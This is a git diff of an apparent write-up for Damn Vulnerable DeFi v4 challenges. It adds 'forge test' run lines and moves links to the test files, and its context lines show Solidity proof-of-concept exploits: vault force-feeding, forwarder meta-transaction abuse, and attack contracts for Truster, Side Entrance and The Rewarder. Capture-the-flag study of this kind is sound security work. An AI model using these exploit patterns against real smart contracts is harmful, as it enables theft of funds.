@@ -12,13 +12,13 @@ _from `_isSolved()`in test_
 - The balance of `UnstoppableVault` is not accounted for unexpected changes (e.g. force feeding ERC20 tokens), by just transfering a small amount to the vault, the below condition fail and revert
 
 ### PoC
-
+See [test/unstoppable/Unstoppable.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/master/test/unstoppable/Unstoppable.t.sol)
 ```solidity
 function test_unstoppable() public checkSolvedByPlayer {
     token.transfer(address(vault), 1e18);
 }
 ```
-_See [test/unstoppable/Unstoppable.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/master/test/unstoppable/Unstoppable.t.sol)_
+Run `forge test --mc UnstoppableChallenge` to validate test
 
 ----
 ## 2.NAIVE RECEIVER
@@ -36,7 +36,7 @@ _from `_isSolved()`in test_
 - Lastly, using a forwarder to execute a meta-transaction, the `msg.sender == trustedForwarder` condition can be met.
 
 ### POC
-
+See [test/naive-receiver/NaiveReceiver.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/master/test/naive-receiver/NaiveReceiver.t.sol)
 ```solidity
  function test_naiveReceiver() public checkSolvedByPlayer {
         bytes[] memory callDataArray = new bytes[](11);
@@ -63,7 +63,7 @@ _from `_isSolved()`in test_
         forwarder.execute(request, signature);
     }
 ```
-See [test/naive-receiver/NaiveReceiver.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/master/test/naive-receiver/NaiveReceiver.t.sol)
+Run `forge test --mc NaiveReceiverChallenge` to validate test
 
 ---- 
 ## 3.TRUSTER
@@ -78,6 +78,7 @@ _from `_isSolved()`in test_
 - Lastly, we need to execute the attack in one ATOMIC transaction. To complete this objective, the best approach is to execute the code in the `constructor()` of a contract. 
 
 ### POC
+See [test/naive-receiver/Truster.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/master/test/naive-receiver/Truster.t.sol)
 ```solidity
 function test_truster() public checkSolvedByPlayer {
     AttackTruster attackTruster = new AttackTruster(address(pool), address(token), recovery, TOKENS_IN_POOL);
@@ -93,7 +94,7 @@ contract AttackTruster {
     }
 }
 ```
-See [test/naive-receiver/Truster.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/master/test/naive-receiver/Truster.t.sol)
+Run `forge test --mc TrusterChallenge` to validate test
 
 ----
 ## 4.SIDE ENTRANCE
@@ -106,6 +107,7 @@ _from `_isSolved()`in test_
 - The attack can be executed by asking a flahs loan through `flashLoan()`and then depositing the total value in the same call using `deposit()`.
 
 ### POC
+See [test/side-entrance/SideEntrance.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/master/test/side-entrance/SideEntrance.t.sol)
 ```solidity
 function test_sideEntrance() public checkSolvedByPlayer {
     Attack attackPool = new Attack(address(pool));
@@ -133,7 +135,7 @@ contract Attack {
     }
 }
 ```
-See [test/side-entrance/SideEntrance.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/master/test/side-entrance/SideEntrance.t.sol)
+Run `forge test --mc SideEntranceChallenge` to validate test
 
 ----
 ## 5.THE REWARDER
@@ -150,6 +152,7 @@ _from `_isSolved()`in test_
 - The attack involves creating an array of identical claim objects, calling `claimRewards()` with this array, and immediately withdrawing the exploited funds.
 
 ### POC
+See [test/the-rewarder/TheRewarder.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/master/test/the-rewarder/TheRewarder.t.sol)
 ```solidity
 function test_theRewarder() public checkSolvedByPlayer {
     uint PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;
@@ -194,4 +197,6 @@ function test_theRewarder() public checkSolvedByPlayer {
     weth.transfer(recovery, weth.balanceOf(player));
 }
 ```
-See [test/the-rewarder/TheRewarder.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/master/test/the-rewarder/TheRewarder.t.sol)
+Run `forge test --mc TheRewarderChallenge` to validate test
+
+----
